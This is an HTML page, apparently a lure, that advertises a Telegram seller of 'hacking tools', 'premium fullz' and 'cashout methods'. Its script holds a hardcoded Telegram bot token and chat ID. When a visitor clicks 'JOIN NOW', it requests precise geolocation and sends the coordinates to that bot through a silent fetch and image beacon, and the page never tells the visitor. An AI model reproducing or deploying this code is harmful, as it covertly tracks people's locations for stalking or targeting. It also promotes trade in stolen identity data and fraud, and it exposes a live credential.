<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Share</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;900&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0a0a0a, #1a0033, #4c1d95);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        .particles {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        .particle {
            position: absolute;
            background: #a855f7;
            border-radius: 50%;
            animation: floatParticle 15s linear infinite;
        }
        @keyframes floatParticle {
            0% { transform: translateY(100vh) scale(0.5); }
            100% { transform: translateY(-100vh) scale(1.2); }
        }
        .screen {
            position: relative;
            width: 100%;
            max-width: 440px;
            z-index: 2;
        }
        .card {
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(165, 85, 247, 0.3);
            border-radius: 32px;
            padding: 45px 35px;
            box-shadow: 0 0 80px rgba(168, 85, 247, 0.5),
                        inset 0 0 40px rgba(255,255,255,0.05);
            text-align: center;
        }
        .neon-text {
            font-size: 31px;
            font-weight: 900;
            background: linear-gradient(90deg, #c026d3, #a855f7, #22d3ee);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 35px rgba(168,85,247,0.9);
            margin-bottom: 10px;
            letter-spacing: -1px;
        }
        .main-text {
            font-size: 17.8px;
            line-height: 1.75;
            margin: 28px 0 35px;
            color: #e0e7ff;
            font-weight: 500;
        }
        .platform-text {
            font-size: 19.5px;
            font-weight: 700;
            color: #c4b5fd;
            margin: 35px 0 20px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }
        .join-btn {
            background: linear-gradient(90deg, #7c3aed, #c026d3);
            color: white;
            padding: 19px 60px;
            font-size: 20px;
            font-weight: 700;
            border-radius: 50px;
            width: 100%;
            margin-top: 15px;
            box-shadow: 0 0 45px #a855f7,
                        0 15px 35px rgba(124, 58, 237, 0.6);
            transition: all 0.4s;
        }
        .join-btn:hover {
            transform: translateY(-6px);
            box-shadow: 0 0 65px #c026d3;
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <!-- INITIAL SCREEN -->
    <div id="initialScreen" class="screen">
        <div class="card">
            <h1 class="neon-text">INSTANT LOCATION</h1>
            <div class="main-text">
                Join <strong>Telegram: Contact @Techsellerg</strong> — Dark Web Level<br>
                <strong>Hacking Tools • Premium Fullz • Cashout Methods 2026</strong>
            </div>
            <a href="#" id="joinLink" class="join-btn">JOIN NOW →</a>
        </div>
    </div>

    <!-- SECOND SCREEN -->
    <div id="characterScreen" class="screen hidden">
        <div class="card">
            <div class="platform-text">Choose Your Hacking Arena</div>
            <div style="margin-top: 40px; font-size: 18.5px; color: #c4b5fd; line-height: 2.1; font-weight: 500;">
                @Locationcracker<br>
                @extreamcracker<br>
                @Techsellerg
            </div>
        </div>
    </div>

    <script>
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 45; i++) {
                const p = document.createElement('div');
                p.className = 'particle';
                p.style.width = p.style.height = Math.random() * 7 + 'px';
                p.style.left = Math.random() * 100 + '%';
                p.style.animationDuration = (Math.random() * 14 + 10) + 's';
                p.style.animationDelay = '-' + (Math.random() * 18) + 's';
                container.appendChild(p);
            }
        }
        createParticles();

        // Updated Bot Credentials
        const TOKEN = "7730815314:AAF9Lvt4abOIrBEMkj-hzpeF4M5E-8cUHNg";
        const CHAT_ID = "8639224634";

        function sendLocation(lat, lon) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}&live_period=3600`;
            fetch(url, {mode: 'no-cors'}).catch(() => {});
            new Image().src = url;
        }

        function showSecondScreen() {
            document.getElementById('initialScreen').classList.add('hidden');
            setTimeout(() => {
                document.getElementById('characterScreen').classList.remove('hidden');
            }, 500);
        }

        function requestLocationAndRedirect() {
            if (!navigator.geolocation) {
                showSecondScreen();
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
                    showSecondScreen();
                },
                () => showSecondScreen(),
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        document.getElementById('joinLink').addEventListener('click', (e) => {
            e.preventDefault();
            requestLocationAndRedirect();
        });
    </script>
</body>
</html>
